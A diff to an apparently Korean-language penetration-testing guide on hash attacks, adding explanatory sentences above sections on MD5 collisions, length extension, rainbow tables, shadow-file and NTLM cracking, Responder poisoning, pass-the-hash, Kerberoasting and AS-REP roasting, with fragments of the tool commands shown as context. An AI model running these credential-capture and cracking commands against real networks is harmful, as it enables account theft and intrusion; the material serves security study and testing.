@@ -29,6 +29,8 @@
 
 ### MD5 충돌 실습
 
+fastcoll 도구로 MD5 충돌 파일 쌍을 생성합니다. 동일한 MD5 해시를 가진 두 개의 다른 파일을 만들어 충돌 공격을 실증합니다.
+
 ```bash
 # MD5 충돌 데모 파일 (fastcoll)
 fastcoll -o collision1.bin collision2.bin
@@ -45,6 +47,8 @@ sha256sum collision1.bin collision2.bin
 ```
 
 ### MD5 충돌을 이용한 공격
+
+길이 확장 공격(Length Extension Attack)을 구현합니다. MD5/SHA-1/SHA-256의 내부 상태를 이용해 HMAC 없이 서명된 메시지를 위조합니다.
 
 ```python
 # 길이 확장 공격 (Length Extension Attack)
@@ -96,6 +100,9 @@ def md5_length_extension(
 
 ### 레인보우 테이블
 
+
+레인보우 테이블은 해시 값에서 원본 패스워드를 역산하기 위해 미리 계산된 해시-패스워드 매핑 테이블입니다. Salt를 적용하면 레인보우 테이블 공격을 무력화할 수 있습니다.
+
 ```bash
 # Ophcrack (Windows LM/NTLM)
 ophcrack -g -d /usr/share/ophcrack/tables/ \
@@ -116,6 +123,8 @@ rcracki_mt -f hash.txt *.rt
 ```
 
 ### bcrypt/Argon2 크래킹 한계
+
+bcrypt와 Argon2의 크래킹 한계를 보여줍니다. 의도적으로 느린 해시 함수는 GPU 병렬 처리를 크게 제한하여 브루트포스를 비실용적으로 만듭니다.
 
 ```bash
 # bcrypt (느린 해시)
@@ -138,6 +147,8 @@ hashcat -m 13900 argon2.txt wordlist.txt
 ```
 
 ### /etc/shadow 파일 공격
+
+Linux /etc/shadow 파일의 해시 형식을 분석합니다. $6$는 SHA-512, $1$는 MD5 crypt 방식이며 john이나 hashcat으로 오프라인 크래킹 가능합니다.
 
 ```bash
 # Linux 비밀번호 해시 형식
@@ -169,6 +180,8 @@ john combined.txt
 
 ### NTLM 해시 추출 및 크래킹
 
+Windows SAM 데이터베이스에서 NTLM 해시를 추출하고 hashcat으로 크래킹합니다. Pass-the-Hash 공격에도 사용할 수 있습니다.
+
 ```bash
 # SAM 데이터베이스에서 해시 추출
 # 방법 1: Mimikatz (메모리에서)
@@ -193,6 +206,8 @@ python3 smbclient.py -hashes ':NTLM_HASH' DOMAIN/USER@TARGET
 
 ### NTLMv2 캡처 및 크래킹
 
+Responder로 네트워크에서 NTLMv2 챌린지-응답을 캡처합니다. LLMNR/NBT-NS 포이즈닝으로 자격증명을 가로채는 중간자 공격입니다.
+
 ```bash
 # Responder로 NTLMv2 캡처
 sudo python3 Responder.py -I eth0 -wrf
@@ -213,6 +228,8 @@ john netntlmv2.txt --wordlist=rockyou.txt --format=netntlmv2
 
 ### Kerberoasting
 
+Kerberos TGS 티켓을 요청하여 서비스 계정 해시를 추출합니다. SPN이 설정된 서비스 계정의 비밀번호를 오프라인으로 크래킹합니다.
+
 ```bash
 # 서비스 티켓 요청 (SPN이 있는 서비스 계정)
 # Impacket
@@ -231,6 +248,8 @@ hashcat -m 19700 kerberoast_aes.txt wordlist.txt
 
 ### AS-REP Roasting
 
+Kerberos 사전 인증이 비활성화된 계정의 AS-REP 응답에서 해시를 추출합니다. 도메인 사용자 열거 후 취약한 계정을 대상으로 합니다.
+
 ```bash
 # Kerberos 사전 인증이 비활성화된 계정 대상
 python3 GetNPUsers.py DOMAIN/ -usersfile users.txt \
@@ -245,6 +264,8 @@ hashcat -m 18200 asrep_hashes.txt wordlist.txt
 ---
 
 ## 5. 해시 공격 자동화
+
+다양한 해시 공격 기법을 자동화하는 Python 스크립트입니다. 해시 타입 식별부터 크래킹 도구 호출까지 파이프라인으로 처리합니다.
 
 ```python
 #!/usr/bin/env python3
@@ -504,6 +525,8 @@ if __name__ == "__main__":
 ## 6. HMAC 및 MAC 공격
 
 ### 타이밍 공격
+
+타이밍 공격(Timing Attack)은 연산 시간의 미세한 차이를 측정하여 비밀 정보를 유추합니다. 일반 문자열 비교 대신 상수 시간 비교 함수를 사용해야 합니다.
 
 ```python
 #!/usr/bin/env python3
